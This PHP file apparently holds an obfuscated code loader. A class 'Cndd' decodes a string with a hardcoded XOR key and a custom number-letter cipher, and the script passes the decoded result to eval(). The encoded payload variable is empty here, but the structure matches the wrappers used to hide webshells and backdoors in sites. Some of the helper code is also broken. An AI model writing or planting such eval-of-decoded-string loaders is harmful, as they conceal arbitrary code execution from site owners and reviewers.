<?php
$enStr = '';
class Cndd{
	private static $Counter = array(10000,1000,100,10,1);
	private static $Unit = array(
		0=>array('100000000' => 'aw','10000000'	=> 'da','1000000' => 'gc','100000' => 'ja','10000' => 'nr','1000' => 'pi','100' => 'sz','10' => 'vk','1' => 'yh'),
		1=>array('100000000' => 'av','10000000'	=> 'dc','1000000' => 'gl','100000' => 'jn','10000' => 'nw','1000' => 'py','100' => 'sa','10' => 'vm','1' => 'yo'),
	);
	private $Combination = 'ak';
	private $_key = 0;
	function setKey($str){
		$str = 'ploer38Hn3e';
		$arr = $this->load_str($str);
		$this->_key = array_sum($arr);
	}
	function load_str($str){
		$i = 0;
		$tmp = array();
		while(isset($str[$i])){
			$tmp[] = ord($str[$i]);
			$i++;
		}
		return $tmp;
	}
	function encrypt($str){
		$arr = $this->load_str($str);
		$tmp = '';
		foreach($arr as $k=>$v){
			$temp = $this->Conversion($v ^ $this->_key);
			$tmp .= $temp.$this->Conlen();
		}
		return $tmp;
	}
	function Conlen(){
		return "3".$this->Combination;
	}
	function getPreg(){
		return join("|\d{1}",self::$Combination);
	}
	function getExp($str){
		$arr = explode($this->Conlen(),$str);
		$temp = array();
		foreach($arr as $k=>$v){
			if(!empty($v)){
				$temp[] = $v;
			}
		}
		return $temp;
	}
	function getNum($str){
		preg_match_all("/\d{1,10}[a-z]+/",$str,$match);
		$arr = $match[0];
		$tmp = 0;
		foreach($arr as $k=>$v){
			preg_match_all("/\d{1,10}|[a-z]+/",$v,$a);
			$unit = $this->getUnit($a[0][1]);
			$tmp += ($a[0][0]*$unit);
		}
		return $tmp;
	}
	function decrypt($str){
		$arr = $this->getExp($str);
		$tmp = '';
		foreach($arr as $k=>$v){
			$tmp .= chr($this->_key ^ $this->getNum($v));
		}
		return $tmp;
	}
	static function Counter($str,&$tmp,$k=0)
	{
		if($str>=self::$Counter[$k]){
			if(isset($tmp[self::$Counter[$k]])){
				$tmp[self::$Counter[$k]]++;
			}else{
				$tmp[self::$Counter[$k]] = 1;
			}
			self::Counter(($str-self::$Counter[$k]),$tmp,$k);
		}else{
			$k = ($k+1);
			if($str>0){
				self::Counter($str,$tmp,$k);
			}
			return $tmp;
		}
	}
	function Conversion($num,$k1=0){
		$arr = array();
		$this->Counter($num,$arr);
		$tmp = '';
		foreach($arr as $k=>$v){
			$tmp .= $v.$this->Unit($k,$k1);
		}
		return $tmp;
	}
	function Unit($key,$k=0){
		return self::$Unit[$k][$key];
	}
	function getUnit($v,$k=0){
		foreach(self::$Unit[$k] as $key=>$val){
			if($v==$val){
				return $key;
			}
		}
		return false;
	}

}
$obj = new Cndd;
$dcStr = $obj->decrypt($enStr);
eval($dcStr);